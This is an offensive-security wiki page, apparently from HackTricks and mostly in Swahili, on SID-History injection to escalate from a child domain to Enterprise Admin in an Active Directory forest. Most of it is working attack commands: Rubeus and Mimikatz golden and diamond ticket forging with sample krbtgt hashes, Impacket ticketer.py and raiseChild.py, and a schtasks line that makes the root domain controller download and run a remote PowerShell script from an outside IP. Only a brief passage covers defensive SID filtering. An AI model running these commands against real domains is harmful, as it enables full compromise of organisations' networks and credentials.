# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Lengo la **SID History Injection Attack** ni kuwezesha **user migration kati ya domains** huku ikiendelea kuhakikisha upatikanaji wa resources kutoka domain ya awali. Hili hufanywa kwa **kuingiza Security Identifier (SID) ya awali ya user kwenye SID History** ya account yake mpya. Muhimu ni kwamba mchakato huu unaweza kutumiwa vibaya ili kutoa access isiyoidhinishwa kwa kuongeza SID ya group yenye privileges za juu (kama vile Enterprise Admins au Domain Admins) kutoka parent domain kwenye SID History. Exploitation hii hutoa access kwa resources zote zilizo ndani ya parent domain.<sup>[[1]](#references)[[2]](#references)</sup>

Kuna methods mbili za kutekeleza attack hii: kupitia kuunda **Golden Ticket** au **Diamond Ticket**.

Ili kupata SID ya group ya **"Enterprise Admins"**, lazima kwanza upate SID ya root domain. Baada ya kuitambua, SID ya group ya Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya root domain. Kwa mfano, ikiwa SID ya root domain ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana ya group ya "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Unaweza pia kutumia groups za **Domain Admins**, ambazo huishia kwa **512**.

Njia nyingine ya kupata SID ya group kutoka domain nyingine (kwa mfano "Domain Admins") ni kutumia:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Kumbuka kwamba inawezekana kuzima SID history katika uhusiano wa trust, jambo litakalosababisha attack hii ishindwe.

Kulingana na [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Kuzima SIDHistory kwenye forest trusts** kwa kutumia netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Kutumia SID Filter Quarantining kwenye external trusts** kwa kutumia netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Kutumia SID Filtering kwenye domain trusts ndani ya forest moja** hakupendekezwi, kwa sababu ni configuration isiyoungwa mkono na inaweza kusababisha breaking changes. Ikiwa domain ndani ya forest haiaminiki, haipaswi kuwa mwanachama wa forest hiyo. Katika hali hii, ni lazima kwanza kugawanya domain zinazoaminika na zisizoaminika katika forests tofauti, ambapo SID Filtering inaweza kutumika kwenye interforest trust

Angalia post hii kwa maelezo zaidi kuhusu kubypass hii: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Mara ya mwisho nilipojaribu hii nilihitaji kuongeza arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) yenye KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Kwa maelezo zaidi kuhusu golden tickets angalia:


{{#ref}}
golden-ticket.md
{{#endref}}


Kwa maelezo zaidi kuhusu diamond tickets angalia:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Pandisha mamlaka hadi DA ya root au Enterprise admin kwa kutumia KRBTGT hash ya domain iliyoathiriwa:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Kwa ruhusa zilizopatikana kupitia attack, unaweza kutekeleza, kwa mfano, attack ya DCSync katika domain mpya:


{{#ref}}
dcsync.md
{{#endref}}

### Kutoka linux

#### Mwongozo kwa [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Hii ni Impacket script ambayo ita-**automate escalating from child to parent domain**. Script inahitaji:

- Target domain controller
- Creds za admin user katika child domain

Mtiririko ni:

- Inapata SID ya Enterprise Admins group ya parent domain
- Inapata hash ya KRBTGT account katika child domain
- Inaunda Golden Ticket
- Inaingia kwenye parent domain
- Inapata credentials za Administrator account katika parent domain
- Ikiwa switch ya `target-exec` imebainishwa, ina-authenticate kwenye Domain Controller ya parent domain kupitia Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Marejeo

- [1] [Persistence ya Active Directory ya Kijanja #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID) ni nini? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Mazingatio ya Usalama kwa Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
